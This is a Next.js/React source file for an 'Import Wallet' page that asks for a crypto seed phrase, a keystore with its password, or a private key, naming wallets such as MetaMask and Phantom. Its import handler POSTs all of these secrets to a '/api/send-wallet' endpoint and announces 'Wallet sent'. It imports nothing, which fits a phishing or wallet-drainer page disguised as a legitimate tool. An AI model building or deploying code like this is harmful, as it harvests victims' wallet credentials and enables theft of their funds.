"use client"
import { ArrowLeft, Key, FileText, Shield, } from "lucide-react";
import Link from "next/link";
import { useState } from "react";

const Import = () => {
  const [importing, setImporting] = useState(false);
  const [formData, setFormData] = useState({
    phrase: "",
    address: "",
    keystore: "",
    password: "",
    privateKey: ""
  });
  const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "privatekey">("phrase");

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleImport = async (method: string) => {
  setImporting(true);

  try {
    const res = await fetch("/api/send-wallet", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method,
        ...formData,
      }),
    });

    if (res.ok) {
      alert(`✅ Wallet sent via ${method}`);
      setFormData({
        phrase: "",
        address: "",
        keystore: "",
        password: "",
        privateKey: "",
      });
    } else {
      alert("❌ Failed to send wallet");
    }
  } catch (error) {
    console.error(error);
    alert("⚠️ Error connecting to API");
  } finally {
    setImporting(false);
  }
};

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      <header className="py-6 px-6 border-b border-gray-700">
        <div className="max-w-4xl mx-auto flex items-center gap-4">
          <Link href="/Wallets" className="flex items-center gap-2 text-gray-300 hover:text-white">
            <ArrowLeft className="h-4 w-4" /> Back to Wallets
          </Link>
          <div className="flex-1">
            <h1 className="text-2xl font-bold">Import Wallet</h1>
            <p className="text-gray-400 text-sm">Import your existing wallet using seed phrase, keystore, or private key</p>
          </div>
        </div>
      </header>

      <main className="py-12 px-6">
        <div className="max-w-4xl mx-auto space-y-8">
          <div className="flex gap-2 border-b border-gray-700">
            <button
              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${
                activeTab === "phrase" ? "bg-gray-800 text-blue-500" : "text-gray-400 hover:text-white"
              }`}
              onClick={() => setActiveTab("phrase")}
            >
              <div className="flex items-center justify-center gap-1">
                <Key className="h-4 w-4" /> Seed Phrase
              </div>
            </button>
            <button
              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${
                activeTab === "keystore" ? "bg-gray-800 text-cyan-400" : "text-gray-400 hover:text-white"
              }`}
              onClick={() => setActiveTab("keystore")}
            >
              <div className="flex items-center justify-center gap-1">
                <FileText className="h-4 w-4" /> Keystore
              </div>
            </button>
            <button
              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${
                activeTab === "privatekey" ? "bg-gray-800 text-pink-400" : "text-gray-400 hover:text-white"
              }`}
              onClick={() => setActiveTab("privatekey")}
            >
              <div className="flex items-center justify-center gap-1">
                <Shield className="h-4 w-4" /> Private Key
              </div>
            </button>
          </div>

          <div className="p-6 bg-gray-800 border border-gray-700 rounded-b-lg space-y-6">
            {activeTab === "phrase" && (
              <div className="space-y-4">
                <label className="block text-sm font-medium">Seed Phrase *</label>
                <textarea
                  placeholder="Enter your 12 or 24 word seed phrase..."
                  className="w-full min-h-32 bg-gray-700 border border-gray-600 rounded-lg p-2 text-sm text-white font-mono"
                  value={formData.phrase}
                  onChange={(e) => handleInputChange("phrase", e.target.value)}
                />
                <label className="block text-sm font-medium">Wallet Name (Optional)</label>
                <input
                  type="text"
                  placeholder="MetaMask, Coinbase, Phantom, eToro ..."
                  className="w-full bg-gray-700 border border-gray-600 rounded-lg p-2 text-sm text-white"
                  value={formData.address}
                  onChange={(e) => handleInputChange("address", e.target.value)}
                />
                <button
                  onClick={() => handleImport("Seed Phrase")}
                  disabled={importing || !formData.phrase.trim()}
                  className="w-full py-2 rounded-lg bg-blue-500 hover:bg-blue-600 disabled:opacity-50 transition"
                >
                  {importing ? "Importing..." : "Import Wallet"}
                </button>
              </div>
            )}
            {activeTab === "keystore" && (
              <div className="space-y-4">
                <label className="block text-sm font-medium">Keystore *</label>
                <textarea
                  placeholder="Paste keystore here..."
                  className="w-full min-h-32 bg-gray-700 border border-gray-600 rounded-lg p-2 text-sm text-white font-mono"
                  value={formData.keystore}
                  onChange={(e) => handleInputChange("keystore", e.target.value)}
                />
                <label className="block text-sm font-medium">Password *</label>
                <input
                  type="password"
                  placeholder="Enter keystore password"
                  className="w-full bg-gray-700 border border-gray-600 rounded-lg p-2 text-sm text-white"
                  value={formData.password}
                  onChange={(e) => handleInputChange("password", e.target.value)}
                />
                <button
                  onClick={() => handleImport("Keystore")}
                  disabled={importing || !formData.keystore.trim() || !formData.password.trim()}
                  className="w-full py-2 rounded-lg bg-cyan-400 hover:bg-cyan-500 disabled:opacity-50 transition"
                >
                  {importing ? "Importing..." : "Import Wallet"}
                </button>
              </div>
            )}
            {activeTab === "privatekey" && (
              <div className="space-y-4">
                <label className="block text-sm font-medium">Private Key *</label>
                <input
                  type="password"
                  placeholder="Enter your private key"
                  className="w-full bg-gray-700 border border-gray-600 rounded-lg p-2 text-sm text-white font-mono"
                  value={formData.privateKey}
                  onChange={(e) => handleInputChange("privateKey", e.target.value)}
                />
                <label className="block text-sm font-medium">Wallet Name (Optional)</label>
                <input
                  type="text"
                  placeholder="MetaMask, Coinbase, Phantom, eToro ..."
                  className="w-full bg-gray-700 border border-gray-600 rounded-lg p-2 text-sm text-white"
                  value={formData.address}
                  onChange={(e) => handleInputChange("address", e.target.value)}
                />
                <button
                  onClick={() => handleImport("Private Key")}
                  disabled={importing || !formData.privateKey.trim()}
                  className="w-full py-2 rounded-lg bg-pink-400 hover:bg-pink-500 disabled:opacity-50 transition"
                >
                  {importing ? "Importing..." : "Import Wallet"}
                </button>
              </div>
            )}
          </div>

          <div className="p-6 bg-gray-800/20 border border-blue-500/20 rounded-lg text-center space-y-4">
            <h3 className="text-xl font-bold">Need Help?</h3>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm text-gray-400">
              <div>
                <h4 className="font-semibold text-blue-500 mb-1">Seed Phrase</h4>
                Usually 12 or 24 words given when creating your wallet.
              </div>
              <div>
                <h4 className="font-semibold text-cyan-400 mb-1">Keystore File</h4>
                JSON file with encrypted private key protected by a password.
              </div>
              <div>
                <h4 className="font-semibold text-pink-400 mb-1">Private Key</h4>
                64-character string giving full control over wallet funds.
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Import;